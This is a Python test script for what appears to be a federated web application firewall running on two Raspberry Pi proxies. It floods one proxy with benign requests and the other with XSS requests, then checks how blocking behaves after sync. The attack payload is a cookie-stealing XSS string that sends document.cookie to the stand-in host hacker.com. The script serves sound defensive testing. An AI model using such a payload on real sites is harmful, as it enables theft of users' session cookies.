import asyncio
import aiohttp
import time
import urllib.parse

RP1_URL = "http://192.168.1.147:8080" # Will receive ONLY benign
RP2_URL = "http://192.168.1.115:8080" # Will receive ONLY attacks

async def send_requests(session, url, payload, count):
    target = f"{url}/?q={urllib.parse.quote(payload)}"
    success = 0
    start = time.time()
    for _ in range(count):
        try:
            async with session.get(target) as resp:
                await resp.read()
                success += 1
        except Exception as e:
            pass
    return success, time.time() - start

async def main():
    print("[*] Starting Rigorous Poisoning & Forgetting Test...")
    print("[*] Phase 1: Inducing Catastrophic Forgetting on RPi1 (Benign Only) and Poisoning on RPi2 (Attacks Only)")
    
    async with aiohttp.ClientSession() as session:
        # Fire 200 benign requests to RPi1
        task1 = send_requests(session, RP1_URL, "api/v1/user_profile/123", 200)
        # Fire 200 attack requests to RPi2
        task2 = send_requests(session, RP2_URL, "<script>fetch('http://hacker.com/?c='+document.cookie)</script>", 200)
        
        results = await asyncio.gather(task1, task2)
        print(f"[+] RPi1 Processed {results[0][0]} Benign Requests in {results[0][1]:.2f}s")
        print(f"[+] RPi2 Processed {results[1][0]} Attack Requests in {results[1][1]:.2f}s")
        
        print("\n[*] Phase 2: Waiting 18 seconds for Federated Sync (Cloud Median Aggregation)...")
        for i in range(18, 0, -1):
            print(f"    Waiting... {i}s", end='\r')
            time.sleep(1)
        print("\n")
        
        print("[*] Phase 3: Evaluating Robustness and Knowledge Retention")
        # Test 1: Does RPi1 still block attacks (did the Cloud save it from Catastrophic Forgetting?)
        try:
            async with session.get(f"{RP1_URL}/?q=<script>alert('test')</script>") as resp:
                print(f"    RPi1 (Benign-Fed) blocking attack? HTTP {resp.status}")
        except Exception as e:
            print(f"    RPi1 Error: {e}")
            
        # Test 2: Does RPi2 still allow benign traffic (did it overfit to attacks?)
        try:
            async with session.get(f"{RP2_URL}/?q=api/v1/health") as resp:
                print(f"    RPi2 (Attack-Fed) allowing benign? HTTP {resp.status}")
        except Exception as e:
            print(f"    RPi2 Error: {e}")

if __name__ == "__main__":
    asyncio.run(main())
